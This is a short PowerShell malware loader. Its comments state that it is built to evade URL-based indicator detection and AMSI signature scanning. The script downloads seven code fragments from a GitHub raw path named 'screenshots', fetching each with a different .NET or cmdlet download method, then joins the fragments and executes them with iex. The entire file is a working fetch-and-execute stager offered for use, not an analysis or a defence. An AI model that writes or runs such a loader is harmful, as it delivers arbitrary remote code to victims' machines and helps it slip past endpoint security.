<#====================================================================
  LOADER — MULTI-SOURCE REASSEMBLY
  Fragments come from different base URLs (different repos or
  raw paths) to evade URL-based IoC detection. Also uses a
  different download method per fragment to evade AMSI
  signature matching on the loader itself.
====================================================================#>

# Different source repos / paths — each fragment looks like it
# comes from a completely unrelated project
$sources = @(
    "https://raw.githubusercontent.com/cem324/screenshots/main",
    "https://raw.githubusercontent.com/cem324/screenshots/main",
    "https://raw.githubusercontent.com/cem324/screenshots/main",
    "https://raw.githubusercontent.com/cem324/screenshots/main",
    "https://raw.githubusercontent.com/cem324/screenshots/main",
    "https://raw.githubusercontent.com/cem324/screenshots/main",
    "https://raw.githubusercontent.com/cem324/screenshots/main"
)

$total = 7
$parts = @()

# Unique download method per fragment to break pattern matching
0..($total - 1) | % {
    $idx = $_
    $url = $sources[$idx] + "/f" + $idx

    switch ($idx % 4) {
        0 {
            $parts += (New-Object Net.WebClient).DownloadString($url)
        }
        1 {
            $parts += (Invoke-WebRequest $url).Content
        }
        2 {
            $wc = New-Object System.Net.WebClient
            $parts += $wc.DownloadString($url)
        }
        3 {
            $h = [System.Net.Http.HttpClient]::new()
            $parts += $h.GetStringAsync($url).GetAwaiter().GetResult()
            $h.Dispose()
        }
    }
}

$full = $parts -join ""
iex $full